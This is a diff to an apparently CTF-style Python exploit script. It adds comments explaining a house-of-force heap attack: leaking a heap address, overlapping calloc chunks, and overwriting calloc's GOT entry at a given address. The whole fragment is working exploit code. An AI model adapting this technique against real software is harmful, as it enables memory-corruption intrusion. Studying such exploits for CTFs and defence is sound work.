@@ -81,6 +81,9 @@ if __name__ == '__main__':
     r.recvuntil("what's your name?")
     s('babo')
 
+
+    # leak address in malloc heap (needed to do house-of-force)
+
     s('c')
     s('n') # calloc(1, 0x40C)
     s('a') # force to do 2 malloc()'s which will prevent merging with the top chunk.
@@ -101,10 +104,9 @@ if __name__ == '__main__':
     
     r.recvuntil("[q]uit")
 
-    #
-    s('g')
+    s('g') 
     r.recvuntil(":")
-    s('40C') # calloc(1, 0x40C)
+    s('40C') # doing 'calloc(1, 0x40C)' which will overlap with the previous calloc(1, 0x40C)
 
     # 0x804d048: calloc@got
     RECIPE = TOP_CHUNK - (0x6d8-0x2b0)
